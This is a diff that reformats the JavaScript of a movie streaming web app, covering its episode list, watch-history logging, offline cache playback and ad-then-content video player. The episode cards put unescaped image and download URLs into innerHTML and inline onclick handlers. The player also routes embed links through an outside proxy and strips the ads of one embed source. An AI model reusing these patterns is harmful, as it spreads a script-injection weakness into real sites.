+          }, 2000); 
+      } 
+  });
 
   function showEpisodes(showTitle, parts, vidId) {
-      document.getElementById('epModalTitle').innerText = showTitle; const container = document.getElementById('epListContainer'); container.innerHTML = '';
+      document.getElementById('epModalTitle').innerText = showTitle; 
+      const container = document.getElementById('epListContainer'); 
+      container.innerHTML = '';
+      
       parts.forEach((p, idx) => {
-          const epTitle = p.title || `Episode ${idx+1}`; const epImg = p.image || 'https://via.placeholder.com/300x169/181828/6E6E98?text=No+Image'; const epDlUrl = p.downloadUrl || p.url; 
-          const card = document.createElement('div'); card.className = 'ep-card';
-          card.innerHTML = `<div class="ep-thumb"><span class="ep-num">Ep ${idx+1}</span><img src="${epImg}" loading="lazy" onerror="this.src='https://via.placeholder.com/300x169/181828/6E6E98?text=No+Image'"></div><div class="ep-title" title="${esc(epTitle)}">${esc(epTitle)}</div><button onclick="event.stopPropagation(); startMovieDownload('${vidId}_${idx}', '${esc(showTitle + ' - ' + epTitle)}', '${epDlUrl}', '${epImg}')" style="position:absolute; bottom:38px; right:5px; z-index:10; background:rgba(230,57,70,0.9); color:white; border:none; border-radius:50%; width:26px; height:26px; display:flex; align-items:center; justify-content:center; cursor:pointer; box-shadow:0 2px 6px rgba(0,0,0,0.6);"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path><polyline points="7 10 12 15 17 10"></polyline><line x1="12" y1="15" x2="12" y2="3"></line></svg></button>`;
-          card.onclick = () => { document.getElementById('episodesModal').style.display = 'none'; const fullTitle = `${showTitle} | ${epTitle}`; player.open(p.url, fullTitle, vidId); };
+          const epTitle = p.title || `Episode ${idx+1}`; 
+          const epImg = p.image || 'https://via.placeholder.com/300x169/181828/6E6E98?text=No+Image'; 
+          const epDlUrl = p.downloadUrl || p.url; 
+          
+          const card = document.createElement('div'); 
+          card.className = 'ep-card';
+          
+          card.innerHTML = `
+            <div class="ep-thumb">
+                <span class="ep-num">Ep ${idx+1}</span>
+                <img src="${epImg}" loading="lazy" onerror="this.src='https://via.placeholder.com/300x169/181828/6E6E98?text=No+Image'">
+            </div>
+            <div class="ep-title" title="${esc(epTitle)}">${esc(epTitle)}</div>
+            <button onclick="event.stopPropagation(); startMovieDownload('${vidId}_${idx}', '${esc(showTitle + ' - ' + epTitle)}', '${epDlUrl}', '${epImg}')" style="position:absolute; bottom:38px; right:5px; z-index:10; background:rgba(230,57,70,0.9); color:white; border:none; border-radius:50%; width:26px; height:26px; display:flex; align-items:center; justify-content:center; cursor:pointer; box-shadow:0 2px 6px rgba(0,0,0,0.6);">
+                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path><polyline points="7 10 12 15 17 10"></polyline><line x1="12" y1="15" x2="12" y2="3"></line></svg>
+            </button>`;
+            
+          card.onclick = () => { 
+              document.getElementById('episodesModal').style.display = 'none'; 
+              const fullTitle = `${showTitle} | ${epTitle}`; 
+              player.open(p.url, fullTitle, vidId); 
+          };
+          
           container.appendChild(card);
       });
       document.getElementById('episodesModal').style.display = 'flex';
   }
 
-  function logWatchHistory(vidId, title, durationSec) { if(!deviceId) return; const histRef = ref(db, `users/${deviceId}/history/${vidId}`); get(histRef).then(snap => { let data = snap.val() || { title: title, plays: 0, totalDuration: 0 }; data.plays += 1; data.totalDuration += durationSec; data.lastPlayed = new Date().toISOString(); update(histRef, data); }); }
+  function logWatchHistory(vidId, title, durationSec) { 
+      if(!deviceId) return; 
+      
+      const histRef = ref(db, `users/${deviceId}/history/${vidId}`); 
+      
+      get(histRef).then(snap => { 
+          let data = snap.val() || { title: title, plays: 0, totalDuration: 0 }; 
+          data.plays += 1; 
+          data.totalDuration += durationSec; 
+          data.lastPlayed = new Date().toISOString(); 
+          update(histRef, data); 
+      }); 
+  }
 
   const WORKER_URL = "https://shy-heart-bf9d.ekgf2003.workers.dev/?url=";
-  window.isAppInstalled = function() { return window.matchMedia('(display-mode: standalone)').matches || window.navigator.standalone === true; };
-  window.smartPlayCheck = async function(vidId, title, url, thumb) { const offlineMovies = JSON.parse(localStorage.getItem('my_downloads') || '[]'); const downloadedMovie = offlineMovies.find(m => m.id === vidId); if (downloadedMovie) { try { const cache = await caches.open('hotfake-cache-v3'); const cachedResponse = await cache.match(downloadedMovie.url); if (cachedResponse) { const videoBlob = await cachedResponse.blob(); const localVideoUrl = URL.createObjectURL(videoBlob); player.open(localVideoUrl, title, vidId); return true; } } catch(e) {} } return false; };
-  window.goToDownloads = function() { if (!window.isAppInstalled()) { if (apkDownloadUrl) { window.open(apkDownloadUrl, '_blank'); } else { alert("App download link will be available soon."); } return; } window.location.href = 'profile.html'; };
-  window.startMovieDownload = async function(id, title, url, thumb) { if (!window.isAppInstalled()) { if (apkDownloadUrl) { if(confirm("Please install our App to download and watch movies offline. Download App now?")) { window.open(apkDownloadUrl, '_blank'); } } else { alert("Available in App Only. Please install the app to watch offline."); } return; } const movieData = { id, title, url, thumb }; localStorage.setItem('pending_download', JSON.stringify(movieData)); window.location.href = 'profile.html'; };
+  
+  window.isAppInstalled = function() { 
+      return window.matchMedia('(display-mode: standalone)').matches || window.navigator.standalone === true; 
+  };
+  
+  window.smartPlayCheck = async function(vidId, title, url, thumb) { 
+      const offlineMovies = JSON.parse(localStorage.getItem('my_downloads') || '[]'); 
+      const downloadedMovie = offlineMovies.find(m => m.id === vidId); 
+      
+      if (downloadedMovie) { 
+          try { 
+              const cache = await caches.open('hotfake-cache-v4'); 
+              const cachedResponse = await cache.match(downloadedMovie.url); 
+              if (cachedResponse) { 
+                  const videoBlob = await cachedResponse.blob(); 
+                  const localVideoUrl = URL.createObjectURL(videoBlob); 
+                  player.open(localVideoUrl, title, vidId); 
+                  return true; 
+              } 
+          } catch(e) {
+              console.log("Offline play failed, falling back to online.");
+          } 
+      } 
+      return false; 
+  };
+  
+  window.goToDownloads = function() { 
+      if (!window.isAppInstalled()) { 
+          if (apkDownloadUrl) { 
+              window.open(apkDownloadUrl, '_blank'); 
+          } else { 
+              alert("App download link will be available soon."); 
+          } 
+          return; 
+      } 
+      window.location.href = 'profile.html'; 
+  };
+  
+  window.startMovieDownload = async function(id, title, url, thumb) { 
+      if (!window.isAppInstalled()) { 
+          if (apkDownloadUrl) { 
+              if(confirm("Please install our App to download and watch movies offline. Download App now?")) { 
+                  window.open(apkDownloadUrl, '_blank'); 
+              } 
+          } else { 
+              alert("Available in App Only. Please install the app to watch offline."); 
+          } 
+          return; 
+      } 
+      
+      const movieData = { id, title, url, thumb }; 
+      localStorage.setItem('pending_download', JSON.stringify(movieData)); 
+      window.location.href = 'profile.html'; 
+  };
 
   class SecureVideoPlayer {
-    constructor() { this.init(); this.uiTimer = null; this.shieldRestoreTimer = null; this.lastTap = 0; }
+    constructor() { 
+        this.init(); 
+        this.uiTimer = null; 
+        this.shieldRestoreTimer = null; 
+        this.lastTap = 0; 
+    }
+    
     init() {
-      this.modal = document.getElementById('playerModal'); this.iframeContainer = document.getElementById('iframeContainer'); this.iframePlayer = document.getElementById('iframePlayer'); this.adContainer = document.getElementById('adContainer'); this.adMediaContainer = document.getElementById('adMediaContainer'); this.skipBtn = document.getElementById('skipBtn'); this.touchCatcher = document.getElementById('touchCatcher'); this.smartOverlay = document.getElementById('smartOverlay'); this.uiBackBtn = document.getElementById('uiBackBtn');
+      this.modal = document.getElementById('playerModal'); 
+      this.iframeContainer = document.getElementById('iframeContainer'); 
+      this.iframePlayer = document.getElementById('iframePlayer'); 
+      this.adContainer = document.getElementById('adContainer'); 
+      this.adMediaContainer = document.getElementById('adMediaContainer'); 
+      this.skipBtn = document.getElementById('skipBtn'); 
+      this.touchCatcher = document.getElementById('touchCatcher'); 
+      this.smartOverlay = document.getElementById('smartOverlay'); 
+      this.uiBackBtn = document.getElementById('uiBackBtn');
+      
       this.uiBackBtn.addEventListener('click', () => this.close());
-      this.touchCatcher.addEventListener('touchstart', (e) => { let now = Date.now(); this.smartOverlay.classList.add('active'); clearTimeout(this.uiTimer); this.uiTimer = setTimeout(() => { this.smartOverlay.classList.remove('active'); }, 3500); if (now - this.lastTap < 400) { e.preventDefault(); return; } this.lastTap = now; this.touchCatcher.style.pointerEvents = 'none'; clearTimeout(this.shieldRestoreTimer); this.shieldRestoreTimer = setTimeout(() => { this.touchCatcher.style.pointerEvents = 'auto'; }, 150); }, {passive: false});
+      
+      this.touchCatcher.addEventListener('touchstart', (e) => { 
+          let now = Date.now(); 
+          this.smartOverlay.classList.add('active'); 
+          
+          clearTimeout(this.uiTimer); 
+          this.uiTimer = setTimeout(() => { 
+              this.smartOverlay.classList.remove('active'); 
+          }, 3500); 
+          
+          if (now - this.lastTap < 400) { 
+              e.preventDefault(); 
+              return; 
+          } 
+          
+          this.lastTap = now; 
+          this.touchCatcher.style.pointerEvents = 'none'; 
+          
+          clearTimeout(this.shieldRestoreTimer); 
+          this.shieldRestoreTimer = setTimeout(() => { 
+              this.touchCatcher.style.pointerEvents = 'auto'; 
+          }, 150); 
+      }, {passive: false});
     }
+    
     async open(url, title, vidId) {
-      this.currentVidId = vidId; this.currentTitle = title; this.sessionStartTime = Date.now(); document.body.style.overflow = 'hidden'; document.body.style.touchAction = 'none'; this.modal.style.display = 'flex'; document.getElementById('overlayTitle').innerText = title; logAction(`Started Playing: ${title}`);
-      if (activeAd && activeAd.enabled && activeAd.url) { this.playAd(url); } else { this.playMainContent(url); }
-      try { if (this.modal.requestFullscreen) await this.modal.requestFullscreen(); if (screen.orientation && screen.orientation.lock) await screen.orientation.lock('landscape').catch(e=>{}); } catch (err) {}
+      this.currentVidId = vidId; 
+      this.currentTitle = title; 
+      this.sessionStartTime = Date.now(); 
+      
+      document.body.style.overflow = 'hidden'; 
+      document.body.style.touchAction = 'none'; 
+      
+      this.modal.style.display = 'flex'; 
+      document.getElementById('overlayTitle').innerText = title; 
+      
+      logAction(`Started Playing: ${title}`);
+      
+      if (activeAd && activeAd.enabled && activeAd.url) { 
+          this.playAd(url); 
+      } else { 
+          this.playMainContent(url); 
+      }
+      
+      try { 
+          if (this.modal.requestFullscreen) await this.modal.requestFullscreen(); 
+          if (screen.orientation && screen.orientation.lock) await screen.orientation.lock('landscape').catch(e=>{}); 
+      } catch (err) {
+          console.log("Fullscreen/Lock orientation failed");
+      }
     }
+    
     playAd(mainUrl) {
-        this.iframeContainer.style.display = 'none'; this.adContainer.style.display = 'flex'; this.skipBtn.style.display = 'block'; this.skipBtn.classList.add('disabled'); let skipTime = parseInt(activeAd.skipTime) || 5; this.skipBtn.innerText = `Skip Ad (${skipTime})`; this.adMediaContainer.innerHTML = '';
-        if (activeAd.type === 'image') { this.adMediaContainer.innerHTML = `<img src="${activeAd.url}" style="max-width:100%; max-height:100%; object-fit:contain;">`; } else if (activeAd.type === 'video') { this.adMediaContainer.innerHTML = `<video id="nativeAdVideo" src="${activeAd.url}" autoplay muted playsinline style="max-width:100%; max-height:100%; object-fit:contain;"></video>`; setTimeout(() => { const v = document.getElementById('nativeAdVideo'); if(v) v.play().catch(e => console.log(e)); }, 150); } else if (activeAd.type === 'youtube') { let match = activeAd.url.match(/(?:youtu\.be\/|youtube\.com\/(?:embed\/|v\/|watch\?v=|watch\?.+&v=))([^&?]+)/); let ytId = match ? match[1] : activeAd.url.split('/').pop(); this.adMediaContainer.innerHTML = `<iframe src="https://www.youtube.com/embed/${ytId}?autoplay=1&mute=1&controls=0&playsinline=1&rel=0" width="100%" height="100%" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>`; }
-        this.adInterval = setInterval(() => { skipTime--; if (skipTime <= 0) { clearInterval(this.adInterval); this.skipBtn.innerText = "Skip Ad ➔"; this.skipBtn.classList.remove('disabled'); this.skipBtn.onclick = () => { logAction("Skipped Ad"); this.playMainContent(mainUrl); }; } else { this.skipBtn.innerText = `Skip Ad (${skipTime})`; } }, 1000);
+        this.iframeContainer.style.display = 'none'; 
+        this.adContainer.style.display = 'flex'; 
+        this.skipBtn.style.display = 'block'; 
+        this.skipBtn.classList.add('disabled'); 
+        
+        let skipTime = parseInt(activeAd.skipTime) || 5; 
+        this.skipBtn.innerText = `Skip Ad (${skipTime})`; 
+        this.adMediaContainer.innerHTML = '';
+        
+        if (activeAd.type === 'image') { 
+            this.adMediaContainer.innerHTML = `<img src="${activeAd.url}" style="max-width:100%; max-height:100%; object-fit:contain;">`; 
+        } else if (activeAd.type === 'video') { 
+            this.adMediaContainer.innerHTML = `<video id="nativeAdVideo" src="${activeAd.url}" autoplay muted playsinline style="max-width:100%; max-height:100%; object-fit:contain;"></video>`; 
+            setTimeout(() => { 
+                const v = document.getElementById('nativeAdVideo'); 
+                if(v) v.play().catch(e => console.log(e)); 
+            }, 150); 
+        } else if (activeAd.type === 'youtube') { 
+            let match = activeAd.url.match(/(?:youtu\.be\/|youtube\.com\/(?:embed\/|v\/|watch\?v=|watch\?.+&v=))([^&?]+)/); 
+            let ytId = match ? match[1] : activeAd.url.split('/').pop(); 
+            this.adMediaContainer.innerHTML = `<iframe src="https://www.youtube.com/embed/${ytId}?autoplay=1&mute=1&controls=0&playsinline=1&rel=0" width="100%" height="100%" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>`; 
+        }
+        
+        this.adInterval = setInterval(() => { 
+            skipTime--; 
+            if (skipTime <= 0) { 
+                clearInterval(this.adInterval); 
+                this.skipBtn.innerText = "Skip Ad ➔"; 
+                this.skipBtn.classList.remove('disabled'); 
+                this.skipBtn.onclick = () => { 
+                    logAction("Skipped Ad"); 
+                    this.playMainContent(mainUrl); 
+                }; 
+            } else { 
+                this.skipBtn.innerText = `Skip Ad (${skipTime})`; 
+            } 
+        }, 1000);
     }
+    
     async playMainContent(embedUrl) {
-        this.adContainer.style.display = 'none'; this.iframeContainer.style.display = 'block'; if(this.adMediaContainer) this.adMediaContainer.innerHTML = '';
-        const nativePlayer = document.getElementById('nativePlayer'); const iframePlayer = document.getElementById('iframePlayer');
-        if (embedUrl.match(/\.(mp4|m3u8)$/i) || embedUrl.includes('.mp4?') || embedUrl.startsWith('blob:')) { this.startNativePlayer(embedUrl, nativePlayer, iframePlayer); return; }
-        try { const response = await fetch(WORKER_URL + encodeURIComponent(embedUrl)); const data = await response.json(); if (data.success && data.direct_url) { this.startNativePlayer(data.direct_url, nativePlayer, iframePlayer); } else { this.startIframePlayer(embedUrl, iframePlayer, nativePlayer); } } catch (error) { this.startIframePlayer(embedUrl, iframePlayer, nativePlayer); }
+        this.adContainer.style.display = 'none'; 
+        this.iframeContainer.style.display = 'block'; 
+        
+        if(this.adMediaContainer) this.adMediaContainer.innerHTML = '';
+        
+        const nativePlayer = document.getElementById('nativePlayer'); 
+        const iframePlayer = document.getElementById('iframePlayer');
+        
+        if (embedUrl.match(/\.(mp4|m3u8)$/i) || embedUrl.includes('.mp4?') || embedUrl.startsWith('blob:')) { 
+            this.startNativePlayer(embedUrl, nativePlayer, iframePlayer); 
+            return; 
+        }
+        
+        try { 
+            const response = await fetch(WORKER_URL + encodeURIComponent(embedUrl)); 
+            const data = await response.json(); 
+            
+            if (data.success && data.direct_url) { 
+                this.startNativePlayer(data.direct_url, nativePlayer, iframePlayer); 
+            } else { 
+                this.startIframePlayer(embedUrl, iframePlayer, nativePlayer); 
+            } 
+        } catch (error) { 
+            this.startIframePlayer(embedUrl, iframePlayer, nativePlayer); 
+        }
     }
-    startNativePlayer(url, nativePlayer, iframePlayer) { iframePlayer.style.display = 'none'; this.smartOverlay.style.display = 'none'; this.touchCatcher.style.pointerEvents = 'none'; nativePlayer.style.display = 'block'; nativePlayer.src = url; nativePlayer.play().catch(e => console.log("Play needs interaction")); }
-    startIframePlayer(url, iframePlayer, nativePlayer) { nativePlayer.style.display = 'none'; nativePlayer.pause(); nativePlayer.src = ''; iframePlayer.style.display = 'block'; this.smartOverlay.style.display = 'flex'; this.touchCatcher.style.pointerEvents = 'auto'; if (url.includes('hdhub4u')) { url = url + '&no-ads=true&hide-controls=true'; } iframePlayer.src = url; this.smartOverlay.classList.add('active'); clearTimeout(this.uiTimer); this.uiTimer = setTimeout(() => { this.smartOverlay.classList.remove('active'); }, 3500); }
-    close() { this.modal.style.display = 'none'; document.body.style.overflow = ''; document.body.style.touchAction = ''; this.iframePlayer.src = ''; const nativePlayer = document.getElementById('nativePlayer'); if(nativePlayer) { nativePlayer.pause(); nativePlayer.src = ''; } clearInterval(this.adInterval); this.smartOverlay.classList.remove('active'); clearTimeout(this.uiTimer); clearTimeout(this.shieldRestoreTimer); if(this.sessionStartTime && this.currentVidId) { let duration = Math.floor((Date.now() - this.sessionStartTime) / 1000); logAction(`Closed Player: ${this.currentTitle} (Watched ${duration}s)`); logWatchHistory(this.currentVidId, this.currentTitle, duration); } if (document.fullscreenElement) { if(document.exitFullscreen) document.exitFullscreen(); } if (screen.orientation && screen.orientation.unlock) { screen.orientation.unlock(); } }
+    
+    startNativePlayer(url, nativePlayer, iframePlayer) { 
+        iframePlayer.style.display = 'none'; 
+        this.smartOverlay.style.display = 'none'; 
+        this.touchCatcher.style.pointerEvents = 'none'; 
+        
+        nativePlayer.style.display = 'block'; 
+        nativePlayer.src = url; 
+        nativePlayer.play().catch(e => console.log("Play needs interaction")); 
+    }
+    
+    startIframePlayer(url, iframePlayer, nativePlayer) { 
+        nativePlayer.style.display = 'none'; 
+        nativePlayer.pause(); 
+        nativePlayer.src = ''; 
+        
+        iframePlayer.style.display = 'block'; 
+        this.smartOverlay.style.display = 'flex'; 
+        this.touchCatcher.style.pointerEvents = 'auto'; 
+        
+        if (url.includes('hdhub4u')) { 
+            url = url + '&no-ads=true&hide-controls=true'; 
+        } 
+        iframePlayer.src = url; 
+        
+        this.smartOverlay.classList.add('active'); 
+        clearTimeout(this.uiTimer); 
+        this.uiTimer = setTimeout(() => { 
+            this.smartOverlay.classList.remove('active'); 
+        }, 3500); 
+    }
+    
+    close() { 
+        this.modal.style.display = 'none'; 
+        document.body.style.overflow = ''; 
+        document.body.style.touchAction = ''; 
+        this.iframePlayer.src = ''; 
+        
+        const nativePlayer = document.getElementById('nativePlayer'); 
+        if(nativePlayer) { 
+            nativePlayer.pause(); 
+            nativePlayer.src = ''; 
+        } 
+        
+        clearInterval(this.adInterval); 
+        this.smartOverlay.classList.remove('active'); 
+        clearTimeout(this.uiTimer); 
+        clearTimeout(this.shieldRestoreTimer); 
+        
+        if(this.sessionStartTime && this.currentVidId) { 
+            let duration = Math.floor((Date.now() - this.sessionStartTime) / 1000); 
+            logAction(`Closed Player: ${this.currentTitle} (Watched ${duration}s)`); 
+            logWatchHistory(this.currentVidId, this.currentTitle, duration); 
+        } 
+        
+        if (document.fullscreenElement) { 
+            if(document.exitFullscreen) document.exitFullscreen(); 
+        } 
+        if (screen.orientation && screen.orientation.unlock) { 
+            screen.orientation.unlock(); 
+        } 
+    }
   }
+  
   const player = new SecureVideoPlayer();
 
   const urlParams = new URLSearchParams(window.location.search);
   const offlinePlayUrl = urlParams.get('offline_play');
-  if (offlinePlayUrl) { setTimeout(() => { player.open(offlinePlayUrl, "Offline/Saved Video", "offline_id"); window.history.replaceState(null, null, window.location.pathname); }, 500); }
+  
+  if (offlinePlayUrl) { 
+      setTimeout(() => { 
+          player.open(offlinePlayUrl, "Offline/Saved Video", "offline_id"); 
+          window.history.replaceState(null, null, window.location.pathname); 
+      }, 500); 
+  }
 
 </script>
 
-<!-- UPDATE: Service worker URL corrected -->
 <script>
   if ('serviceWorker' in navigator) {
     window.addEventListener('load', () => {
@@ -529,3 +1060,4 @@
 
 </body>
 </html>
+
